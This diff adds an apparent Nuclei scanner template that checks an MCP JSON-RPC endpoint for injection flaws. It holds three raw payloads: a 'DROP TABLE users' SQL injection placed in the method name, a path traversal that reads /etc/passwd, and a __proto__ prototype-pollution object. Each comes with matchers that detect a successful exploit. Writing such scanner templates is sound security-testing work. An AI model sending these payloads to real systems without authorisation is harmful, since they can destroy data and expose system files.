@@ -1,0 +1,86 @@
+id: mcp-jsonrpc-injection
+
+info:
+  name: MCP JSON-RPC Injection
+  author: crowdsentinel
+  severity: high
+  description: |
+    Tests for SQL injection, path traversal, and prototype pollution
+    via crafted JSON-RPC method names and parameters. Matchers look
+    for evidence of successful exploitation (SQL errors, file contents,
+    elevated privileges) rather than simple payload echo-back.
+  tags: mcp,injection,sqli,path-traversal,prototype-pollution
+
+http:
+  - raw:
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+
+        {"jsonrpc":"2.0","method":"tools/call; DROP TABLE users","params":{"name":"search_documents","arguments":{"index":"winlogbeat-*","query":"test"}},"id":1}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "syntax error"
+          - "SQL"
+          - "relation \"users\" does not exist"
+          - "table or view not found"
+          - "mysql_fetch"
+          - "pg_query"
+        condition: or
+
+      - type: status
+        status:
+          - 500
+
+  - raw:
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+
+        {"jsonrpc":"2.0","method":"tools/call","params":{"name":"search_documents","arguments":{"index":"../../../etc/passwd","query":"*"}},"id":2}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0"
+          - "/bin/bash"
+          - "/bin/sh"
+          - "daemon:x:"
+        condition: or
+
+      - type: status
+        status:
+          - 500
+
+  - raw:
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+
+        {"jsonrpc":"2.0","method":"tools/call","params":{"name":"search_documents","arguments":{"index":"winlogbeat-*","query":"test","__proto__":{"admin":true},"constructor":{"prototype":{"isAdmin":true}}}},"id":3}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"admin\":true"
+          - "\"isAdmin\":true"
+          - "\"polluted\":true"
+        condition: or
+
+      - type: status
+        status:
+          - 500
